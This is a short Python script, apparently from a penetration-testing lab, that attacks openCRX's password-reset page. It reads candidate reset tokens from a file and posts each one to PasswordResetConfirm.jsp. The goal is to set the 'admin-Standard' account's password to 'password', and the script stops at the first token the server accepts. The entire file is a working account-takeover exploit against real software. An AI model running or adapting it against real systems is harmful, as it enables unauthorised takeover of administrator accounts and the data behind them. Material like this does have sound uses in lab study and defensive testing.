#!/usr/bin/python3

import requests
import argparse

parser = argparse.ArgumentParser()
#parser.add_argument('-u','--user', help='Username to target', required=True)
#parser.add_argument('-p','--password', help='Password value to set', required=True)
args = parser.parse_args()

target = "http://opencrx:8080/opencrx-core-CRX/PasswordResetConfirm.jsp"
user = 'admin-Standard'
password = 'password'
print("Starting token spray. Standby.")
with open("tokens.txt", "r") as f:
    for word in f:
        print(word)
        # t=resetToken&p=CRX&s=Standard&id=guest&password1=password&password2=password
        # t=i8wOdACA9sJrgLehMGWZW7RoCC86Y0bKfmAsAZQX&p=CRX&s=Standard&id=guest&password1=password&password2=password
        payload = {'t':word.rstrip(), 'p':'CRX','s':'Standard','id':user,'password1':password,'password2':password}
        r = requests.post(url=target, data=payload)
        res = r.text
        if "Unable to reset password" not in res:
            print("Successful reset with token: %s" % word)
            break